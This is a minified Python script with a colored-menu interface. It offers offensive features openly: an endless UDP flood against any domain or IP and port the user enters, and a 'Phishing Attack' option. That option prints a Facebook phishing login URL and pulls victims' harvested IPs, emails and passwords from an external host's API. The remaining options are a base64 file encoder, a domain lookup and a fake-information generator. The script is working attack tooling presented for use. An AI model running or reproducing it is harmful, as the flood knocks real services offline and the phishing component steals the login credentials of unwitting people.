Z='\n   >>> Exit'
Y='      <<< '
X=ImportError
V='         >>> Not Found!'
U='2'
R='         >>> Error!'
Q=open
N='1'
L=True
K=KeyboardInterrupt
H=False
F=input
D=str
B=print
import os
try:import requests
except X:os.system('pip install requests')
try:import bs4
except X:os.system('pip install bs4')
try:
	from platform import system as a;import os,socket as M,random as b,base64 as W,fkinfo as c,requests,json;from bs4 import BeautifulSoup;d=a()
	if d=='Windows':P='cls'
	else:P='clear'
	os.system(P);I='\x1b[1;32;40m';E='\x1b[1;32;31m';A='\x1b[0;32;37m';J='\x1b[1;32;33m';C='\x1b[1;32;37m';S=I+"\n     _____                \n    / ____|                    \n    | |  __  _ __ ___  ___ _ __  \n    | | |_ | | '__/ _ \\/ _ \\ '_ \\ \n    | |__| | | | |  __/  __/ | | |\n    \\_____ | |_|  \\___|\\___|_| |_|\n    "+E+' \n        TOOL                      '+A;B(S);O=J+"\n    [Enter 'c' Or Press Ctrl+C To Exit]"+A;B(O);T=C+'    [@] Choice Number Plase\n    [0] For Clear Screen\n    [1] DDOS Attack\n    [2] Encode/Decode Files\n    [3] Get ip By Domain\n    [4] Fake Information\n    [5] Phishing Attack\n    '+A;B(T)
	def e():
		V="Send %s packet To '%s:%s'";W=C+'\n        [@] Choice Number\n        [1] Attack Domain\n        [2] Attack Ip\n        '+A;B(W);J=D(F(C+Y+A))
		if J==N:
			J=D(F(C+'     Enter Domain <<< '+A))
			try:Q=M.gethostbyname(J);O=L
			except:B(E+'            >>> Plase Enter Like This www.example.com!')
		elif J==U:J=D(F(C+'     Enter Ip <<< '+A));Q=J;O=L
		else:B(E+'\n   >>> Not Found !');O=H
		G=D(F(C+'      Enter The Port (Port:80)  <<< '+A))
		if G.__len__()>0:
			try:G=int(G)
			except:B(E+'         >>> Error Port (Port:80)');G=80
		else:G=80
		if O:
			X=M.socket(M.AF_INET,M.SOCK_DGRAM)
			if O:
				Z=b._urandom(1490);R=0
				while L:
					try:X.sendto(Z,(Q,G));B(I+V%(R,Q,G),A);R+=1
					except K:os.system(P);B(S);B(A+"\n    [Enter 'c' Or Press Ctrl+C To Exit]\n");B(T);B(I+V%(R,Q,G),A);break
					except:O=H;B(E+'   >>> Error'+A);break
			else:0
		else:0
	def f():
		T='   File Path   <<< '
		try:
			P=C+'\n            [@] Choice Number\n            [1] Base64'+A;B(P);G=D(F(C+Y+A))
			if G==N:X='base64';J=L
			else:B(E+V+A);J=H
			if J:
				P=C+'\n                [@] Choice Number\n                [1] Encode\n                [2] Decode'+A;B(P);G=D(F(C+'   $2   <<< '+A))
				if G==N:S=H
				elif G==U:S=L
				else:B(E+V+A);J=H
				if J:
					if S==H:
						G=D(F(C+T+A))
						try:M=Q(G,'r').read()
						except:J=H;B(E+R+A)
						if J:M=W.b64encode(M.encode());O=Q(G,'wb');O.write(M);O.close();B(I+'         >>> Encoding'+A)
					else:
						G=D(F(C+T+A))
						try:M=Q(G,'rb').read()
						except:J=H;B(E+R+A)
						if J:M=W.b64decode(M);O=Q(G,'wb');O.write(M);O.close();B(I+'         >>> Decoding'+A)
		except K:pass
	def g():
		try:
			H=D(F(C+'  Enter DataType (txt)   <<< '+A));G=D(F(C+'  Enter loops (1)   <<< '+A))
			if D(G).__len__()>0:G=int(G)
			else:G=1
			if H.__len__()>0:0
			else:H='txt'
			J=c.information.fake.info(H,G);J=C+f"\n{I}Result >>>{C}\n\n{J}\n"+A;B(J)
		except K:return
		except:B(E+R+A)
	def h():
		try:
			G=D(F(C+'   Enter domain   <<< '+A))
			try:H=M.gethostbyname(G);B(I+f"         >>> {H}"+A)
			except K:pass
			except:B(E+R+A)
		except K:pass
	def i():
		try:
			P=C+'\n            [@] Choice Number\n            [1] Facebook\n            '+A;B(P);Q=D(F(C+'    <<< '+A))
			if Q==N:U='facebook';M=L
			else:B(E+V+A);M=H
			if M:
				R=C+'[URL] http://logintoweb.rf.gd/'+A;B(R);S=requests.get('http://logintoweb.rf.gd/admin/api.php');J=D(S.text)
				if J.__len__()>0:
					J=J.split('==>>>')
					try:
						O=0
						for G in J:O+=1;G=json.loads(G);T=I+f"""
    # {O}
    IP : {G["ip"]}
    EMAIL : {G["email"]}
    PASSWORD : {G["password"]}
    DATE : {G["date"]}"""+A;B(T)
					except:B(C+"      >>> End Application if Don't Print Data Plase Try Again"+A)
				else:B(E+' >>> Not Found Users'+A)
			else:return
		except K:return
	j=L
	while j:
		G=D(F(J+' <<< '+A))
		if G==N:e()
		elif G=='0':os.system(P);B(S);B(O);B(T)
		elif G.lower()=='c':B(J+Z+A);exit()
		elif G==U:f()
		elif G=='3':h()
		elif G=='4':g()
		elif G=='5':i()
		else:B(E+'   >>> Not Found !')
except K:B(J+Z+A);exit()
